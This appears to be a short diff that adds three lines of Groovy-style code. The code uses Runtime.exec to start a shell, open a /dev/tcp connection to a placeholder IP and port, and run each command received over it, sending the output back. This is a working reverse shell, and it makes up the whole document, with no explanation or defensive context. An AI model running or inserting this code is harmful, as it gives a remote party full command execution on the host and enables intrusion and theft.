@@ -1,0 +1,3 @@
+r = Runtime.getRuntime()
+p = r.exec(["$shell","-c","exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
